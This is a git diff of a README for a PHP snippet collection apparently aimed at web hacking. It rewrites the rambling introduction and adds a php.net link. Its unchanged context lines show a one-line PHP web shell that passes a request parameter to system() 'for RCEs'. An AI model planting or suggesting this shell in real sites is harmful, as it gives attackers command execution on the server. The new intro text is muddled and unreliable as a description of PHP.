@@ -1,6 +1,6 @@
 # Useful_PHP
 
-[RTFM here is a documentation](https://www.php.net/) below is just useful php with description how its workings
+[RTFM here is a documentation](https://www.php.net/) below is just useful php with description how its workings. One of the many Web-Hackronomicons of eye-brow-raising levels of secure language design with the insanity of multiple function calls capable of doing the exact same thing. Try to remember which are all of the vulnerable code in which server context anduser context when humans like trust and favourites, where is the person that shouts remember the Pwhpaarrr 1.69 version of with a similar function called that is allowed by some design loop hole. 
 
 PHP webserver
 ```bash
@@ -23,7 +23,6 @@ Http `cmd` super global variable function for RCEs
 ```php
 <?php system($_REQUEST['cmd']); ?>
 ```
-
 
 phpinfo displayer
 ```PHP
@@ -51,6 +50,7 @@ if (isset($_POST['file'])) {
 ?>
 ```
 
+Put your horrible PHP in html: [php.net](https://www.php.net/manual/en/language.basic-syntax.phpmode.php)
 
 ## References
 
